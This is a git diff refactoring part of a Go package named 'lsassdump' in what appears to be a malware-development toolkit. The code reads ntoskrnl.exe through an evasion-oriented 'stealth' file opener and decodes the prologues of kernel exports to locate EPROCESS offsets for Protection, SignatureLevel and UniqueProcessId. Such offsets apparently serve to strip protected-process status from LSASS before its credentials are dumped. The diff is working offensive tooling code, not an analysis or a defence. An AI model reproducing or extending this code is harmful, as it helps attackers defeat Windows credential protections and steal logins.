@@ -1,13 +1,12 @@
 package lsassdump
 
 import (
-	"debug/pe"
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"io"
 
 	"github.com/oioio-space/maldev/evasion/stealthopen"
+	"github.com/oioio-space/maldev/pe/parse"
 )
 
 // Dynamic EPROCESS offset discovery.
@@ -52,7 +51,7 @@ var ErrProtectionOffsetNotFound = errors.New("lsassdump: PsIsProtectedProcess pr
 // `%SystemRoot%\System32\ntoskrnl.exe`; pass an empty string to
 // pick that up via os.Getenv("SystemRoot"). On Linux/CI you supply
 // a captured ntoskrnl.exe explicitly (the parser is pure Go via
-// debug/pe — no Windows runtime dependency).
+// pe/parse → saferwall/pe — no Windows runtime dependency).
 //
 // `opener` is the optional stealthopen.Opener — pass nil for plain
 // os.Open, non-nil to route the read through a stealth strategy
@@ -65,28 +64,17 @@ var ErrProtectionOffsetNotFound = errors.New("lsassdump: PsIsProtectedProcess pr
 // A mismatch surfaces as ErrProtectionOffsetNotFound to refuse
 // shipping a wrong value.
 func DiscoverProtectionOffset(path string, opener stealthopen.Opener) (uint32, error) {
-	path, err := defaultNtoskrnlPath(path, "DiscoverProtectionOffset")
+	pf, err := openNtoskrnl(path, opener, "DiscoverProtectionOffset")
 	if err != nil {
 		return 0, err
 	}
-
-	f, err := stealthopen.Use(opener).Open(path)
-	if err != nil {
-		return 0, fmt.Errorf("open %s: %w", path, err)
-	}
-	defer f.Close()
-
-	pf, err := pe.NewFile(f)
-	if err != nil {
-		return 0, fmt.Errorf("parse %s: %w", path, err)
-	}
 	defer pf.Close()
 
-	offA, err := extractProtectionOffset(f, pf, "PsIsProtectedProcess")
+	offA, err := extractProtectionOffset(pf, "PsIsProtectedProcess")
 	if err != nil {
 		return 0, fmt.Errorf("PsIsProtectedProcess: %w", err)
 	}
-	offB, err := extractProtectionOffset(f, pf, "PsIsProtectedProcessLight")
+	offB, err := extractProtectionOffset(pf, "PsIsProtectedProcessLight")
 	if err != nil {
 		return 0, fmt.Errorf("PsIsProtectedProcessLight: %w", err)
 	}
@@ -102,64 +90,41 @@ func DiscoverProtectionOffset(path string, opener stealthopen.Opener) (uint32, e
 	return offA, nil
 }
 
-// SignatureLevelOffset returns EPROCESS.SignatureLevel given the
-// EPROCESS.Protection offset. Per kvc's OffsetFinder, SignatureLevel
-// always precedes Protection by 2 bytes. Stable Vista → 25H2.
+// SignatureLevelOffset returns the EPROCESS.SignatureLevel byte
+// offset given the Protection offset. Stable: SignatureLevel always
+// sits 2 bytes before Protection in the EPROCESS struct.
 func SignatureLevelOffset(protectionOff uint32) uint32 {
 	return protectionOff - 2
 }
 
-// SectionSignatureLevelOffset returns EPROCESS.SectionSignatureLevel
-// given the EPROCESS.Protection offset. Always precedes Protection
-// by 1 byte.
+// SectionSignatureLevelOffset returns the
+// EPROCESS.SectionSignatureLevel byte offset given the Protection
+// offset. Stable: SectionSignatureLevel always sits 1 byte before
+// Protection in the EPROCESS struct.
 func SectionSignatureLevelOffset(protectionOff uint32) uint32 {
 	return protectionOff - 1
 }
 
-// DiscoverUniqueProcessIdOffset reads ntoskrnl.exe at `path` and
-// returns the EPROCESS.UniqueProcessId byte offset. Extracted from
-// the first instruction of PsGetProcessId, which always compiles to:
-//
-//	mov rax, qword ptr [rcx + EPROCESS.UniqueProcessId_offset]
-//	ret
-//
-// On x64 that's `48 8B 81 [disp32]` — REX.W + MOV + ModR/M for
-// `[rcx+disp32]`. The disp32 starts at file offset 3 of the function.
-//
-// Empty path defaults to %SystemRoot%\System32\ntoskrnl.exe (same
+// DiscoverUniqueProcessIdOffset returns the
+// EPROCESS.UniqueProcessId byte offset by parsing the
+// `PsGetProcessId` export's prologue. Empty path defaults to
+// `%SystemRoot%\System32\ntoskrnl.exe` (same path-default
 // convention as DiscoverProtectionOffset). `opener` is the optional
 // stealthopen.Opener — pass nil for plain os.Open.
 func DiscoverUniqueProcessIdOffset(path string, opener stealthopen.Opener) (uint32, error) {
-	path, err := defaultNtoskrnlPath(path, "DiscoverUniqueProcessIdOffset")
+	pf, err := openNtoskrnl(path, opener, "DiscoverUniqueProcessIdOffset")
 	if err != nil {
 		return 0, err
 	}
-
-	f, err := stealthopen.Use(opener).Open(path)
-	if err != nil {
-		return 0, fmt.Errorf("open %s: %w", path, err)
-	}
-	defer f.Close()
-
-	pf, err := pe.NewFile(f)
-	if err != nil {
-		return 0, fmt.Errorf("parse %s: %w", path, err)
-	}
 	defer pf.Close()
 
-	rva, err := findExportRVA(pf, "PsGetProcessId")
+	rva, err := pf.ExportRVA("PsGetProcessId")
 	if err != nil {
 		return 0, fmt.Errorf("PsGetProcessId: %w", err)
 	}
-	sec := sectionForRVA(pf, rva)
-	if sec == nil {
-		return 0, fmt.Errorf("RVA 0x%X not in any section", rva)
-	}
-	fileOff := int64(sec.Offset) + int64(rva) - int64(sec.VirtualAddress)
-
-	prologue := make([]byte, 7)
-	if _, err := f.ReadAt(prologue, fileOff); err != nil {
-		return 0, fmt.Errorf("read PsGetProcessId prologue @0x%X: %w", fileOff, err)
+	prologue, err := pf.DataAtRVA(rva, 7)
+	if err != nil {
+		return 0, fmt.Errorf("read PsGetProcessId prologue: %w", err)
 	}
 	// 48 8B 81 [disp32]: REX.W + mov r64, r/m64 + ModR/M [rcx+disp32].
 	if prologue[0] == 0x48 && prologue[1] == 0x8B && isModRMRcxDisp32(prologue[2]) {
@@ -196,24 +161,32 @@ func DiscoverActiveProcessLinksOffset(uniqueProcessIDOff uint32) uint32 {
 // `opener` is the optional stealthopen.Opener — pass nil for plain
 // os.Open.
 func DiscoverInitialSystemProcessRVA(path string, opener stealthopen.Opener) (uint32, error) {
-	path, err := defaultNtoskrnlPath(path, "DiscoverInitialSystemProcessRVA")
+	pf, err := openNtoskrnl(path, opener, "DiscoverInitialSystemProcessRVA")
 	if err != nil {
 		return 0, err
 	}
-
-	f, err := stealthopen.Use(opener).Open(path)
-	if err != nil {
-		return 0, fmt.Errorf("open %s: %w", path, err)
-	}
-	defer f.Close()
-
-	pf, err := pe.NewFile(f)
-	if err != nil {
-		return 0, fmt.Errorf("parse %s: %w", path, err)
-	}
 	defer pf.Close()
+	return pf.ExportRVA("PsInitialSystemProcess")
+}
 
-	return findExportRVA(pf, "PsInitialSystemProcess")
+// openNtoskrnl resolves the ntoskrnl.exe path (defaulting to
+// %SystemRoot%\System32\ntoskrnl.exe when empty), reads the bytes
+// through `opener`, and returns a *parse.File ready for export /
+// RVA queries. Callers must Close.
+func openNtoskrnl(path string, opener stealthopen.Opener, fnName string) (*parse.File, error) {
+	path, err := defaultNtoskrnlPath(path, fnName)
+	if err != nil {
+		return nil, err
+	}
+	raw, err := stealthopen.OpenRead(opener, path)
+	if err != nil {
+		return nil, fmt.Errorf("read %s: %w", path, err)
+	}
+	pf, err := parse.FromBytes(raw, path)
+	if err != nil {
+		return nil, fmt.Errorf("parse %s: %w", path, err)
+	}
+	return pf, nil
 }
 
 // extractProtectionOffset finds `name` in the PE's exports, reads
@@ -235,156 +208,37 @@ func DiscoverInitialSystemProcessRVA(path string, opener stealthopen.Opener) (ui
 //   - PsIsProtectedProcessLight  → `8A 91 …` (mov dl)
 //
 // Both decoded to the same disp32 = EPROCESS.Protection offset.
-func extractProtectionOffset(f io.ReaderAt, pf *pe.File, name string) (uint32, error) {
-	rva, err := findExportRVA(pf, name)
+func extractProtectionOffset(pf *parse.File, name string) (uint32, error) {
+	rva, err := pf.ExportRVA(name)
 	if err != nil {
 		return 0, err
 	}
-
-	sec := sectionForRVA(pf, rva)
-	if sec == nil {
-		return 0, fmt.Errorf("RVA 0x%X not in any section", rva)
-	}
-	fileOff := int64(sec.Offset) + int64(rva) - int64(sec.VirtualAddress)
-
-	prologue := make([]byte, 8)
-	if _, err := f.ReadAt(prologue, fileOff); err != nil {
-		return 0, fmt.Errorf("read prologue @0x%X: %w", fileOff, err)
+	// 8 bytes covers every encoding above (longest is `0F B6 81 disp32` = 7 bytes).
+	prologue, err := pf.DataAtRVA(rva, 8)
+	if err != nil {
+		return 0, fmt.Errorf("read %s prologue: %w", name, err)
 	}
 
-	// Two-byte opcode (0F xx): movzx and friends. ModR/M sits at
-	// offset 2; disp32 follows at offset 3.
-	if prologue[0] == 0x0F && isModRMRcxDisp32(prologue[2]) {
+	// Try each known prologue shape; first match wins.
+	switch {
+	case prologue[0] == 0x0F && prologue[1] == 0xB6 && isModRMRcxDisp32(prologue[2]):
+		// movzx eax, byte ptr [rcx+disp32] → disp32 at [3:7]
 		return binary.LittleEndian.Uint32(prologue[3:7]), nil
-	}
-	// One-byte opcode: test (F6) / mov (8A, 8B, 88, 89). ModR/M sits
-	// at offset 1; disp32 follows at offset 2.
-	if isModRMRcxDisp32(prologue[1]) {
+	case prologue[0] == 0xF6 && isModRMRcxDisp32(prologue[1]):
+		// test byte ptr [rcx+disp32], imm8 → disp32 at [2:6]
+		return binary.LittleEndian.Uint32(prologue[2:6]), nil
+	case prologue[0] == 0x8A && isModRMRcxDisp32(prologue[1]):
+		// mov r8, byte ptr [rcx+disp32] → disp32 at [2:6]
 		return binary.LittleEndian.Uint32(prologue[2:6]), nil
 	}
-	return 0, fmt.Errorf("%w: prologue %02X %02X %02X (no [rcx+disp32] addressing form recognised)",
-		ErrProtectionOffsetNotFound, prologue[0], prologue[1], prologue[2])
+	return 0, fmt.Errorf("%w: %s prologue %02X %02X %02X",
+		ErrProtectionOffsetNotFound, name, prologue[0], prologue[1], prologue[2])
 }
 
-// isModRMRcxDisp32 reports whether b is a ModR/M byte that encodes
+// isModRMRcxDisp32 returns true when the ModR/M byte addresses
 // `[rcx + disp32]` for ANY reg field. Bit pattern: `10 rrr 001`
 // (mod=10 → 32-bit displacement; rm=001 → RCX). Mask 0xC7 isolates
 // the mod + rm bits; the comparison value 0x81 is `mod=10, rm=001`.
 func isModRMRcxDisp32(b byte) bool {
 	return (b & 0xC7) == 0x81
-}
-
-// findExportRVA parses the IMAGE_EXPORT_DIRECTORY by hand to locate
-// `name`. debug/pe doesn't expose exported symbols directly on x64
-// PE files; we walk the directory ourselves. Stable across every
-// PE32+ kernel image we've seen.
-func findExportRVA(pf *pe.File, name string) (uint32, error) {
-	oh, ok := pf.OptionalHeader.(*pe.OptionalHeader64)
-	if !ok {
-		return 0, fmt.Errorf("not a PE32+ image (need x64 ntoskrnl)")
-	}
-	if len(oh.DataDirectory) < 1 {
-		return 0, fmt.Errorf("no data directories")
-	}
-	exportDir := oh.DataDirectory[0]
-	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
-		return 0, fmt.Errorf("export directory empty")
-	}
-
-	// Walk to find the section that holds the export directory.
-	sec := sectionForRVA(pf, exportDir.VirtualAddress)
-	if sec == nil {
-		return 0, fmt.Errorf("export directory RVA 0x%X not in any section", exportDir.VirtualAddress)
-	}
-	secData, err := sec.Data()
-	if err != nil {
-		return 0, fmt.Errorf("read export section: %w", err)
-	}
-
-	// IMAGE_EXPORT_DIRECTORY layout (40 bytes):
-	//   +0x00 Characteristics      uint32
-	//   +0x04 TimeDateStamp        uint32
-	//   +0x08 MajorVersion         uint16
-	//   +0x0A MinorVersion         uint16
-	//   +0x0C Name                 uint32
-	//   +0x10 Base                 uint32
-	//   +0x14 NumberOfFunctions    uint32
-	//   +0x18 NumberOfNames        uint32
-	//   +0x1C AddressOfFunctions   uint32
-	//   +0x20 AddressOfNames       uint32
-	//   +0x24 AddressOfNameOrdinals uint32
-	dirStart := exportDir.VirtualAddress - sec.VirtualAddress
-	if uint32(len(secData)) < dirStart+40 {
-		return 0, fmt.Errorf("export directory truncated")
-	}
-	d := secData[dirStart : dirStart+40]
-	numNames := binary.LittleEndian.Uint32(d[0x18:0x1C])
-	addrFns := binary.LittleEndian.Uint32(d[0x1C:0x20])
-	addrNames := binary.LittleEndian.Uint32(d[0x20:0x24])
-	addrOrds := binary.LittleEndian.Uint32(d[0x24:0x28])
-
-	// AddressOfFunctions: array of `NumberOfFunctions` × uint32 RVAs.
-	// AddressOfNames: array of `NumberOfNames` × uint32 RVAs to ASCII strings.
-	// AddressOfNameOrdinals: array of `NumberOfNames` × uint16 ordinal indexes.
-	for i := uint32(0); i < numNames; i++ {
-		nameRVA := readU32At(secData, sec.VirtualAddress, addrNames+i*4)
-		ord := readU16At(secData, sec.VirtualAddress, addrOrds+i*2)
-		fnRVA := readU32At(secData, sec.VirtualAddress, addrFns+uint32(ord)*4)
-
-		exportName := readAsciizAt(secData, sec.VirtualAddress, nameRVA)
-		if exportName == name {
-			return fnRVA, nil
-		}
-	}
-	return 0, fmt.Errorf("export %q not found", name)
-}
-
-// sectionForRVA returns the PE section whose virtual range covers
-// the given RVA, or nil if no section matches. Callers handle nil
-// — corrupt PEs or RVAs into sparse sections fall through cleanly.
-func sectionForRVA(pf *pe.File, rva uint32) *pe.Section {
-	for _, s := range pf.Sections {
-		if rva >= s.VirtualAddress && rva < s.VirtualAddress+s.VirtualSize {
-			return s
-		}
-	}
-	return nil
-}
-
-// readU32At reads a uint32 from secData at the given absolute RVA,
-// translating via secVA (the section's virtual address). Returns
-// 0 on out-of-bounds.
-func readU32At(secData []byte, secVA, rva uint32) uint32 {
-	off := int64(rva) - int64(secVA)
-	if off < 0 || off+4 > int64(len(secData)) {
-		return 0
-	}
-	return binary.LittleEndian.Uint32(secData[off : off+4])
-}
-
-// readU16At reads a uint16 from secData at the given absolute RVA.
-func readU16At(secData []byte, secVA, rva uint32) uint16 {
-	off := int64(rva) - int64(secVA)
-	if off < 0 || off+2 > int64(len(secData)) {
-		return 0
-	}
-	return binary.LittleEndian.Uint16(secData[off : off+2])
-}
-
-// readAsciizAt reads a null-terminated ASCII string from secData
-// at the given RVA. Caps at 256 bytes.
-func readAsciizAt(secData []byte, secVA, rva uint32) string {
-	off := int64(rva) - int64(secVA)
-	if off < 0 || off >= int64(len(secData)) {
-		return ""
-	}
-	end := off
-	max := off + 256
-	if max > int64(len(secData)) {
-		max = int64(len(secData))
-	}
-	for end < max && secData[end] != 0 {
-		end++
-	}
-	return string(secData[off:end])
 }
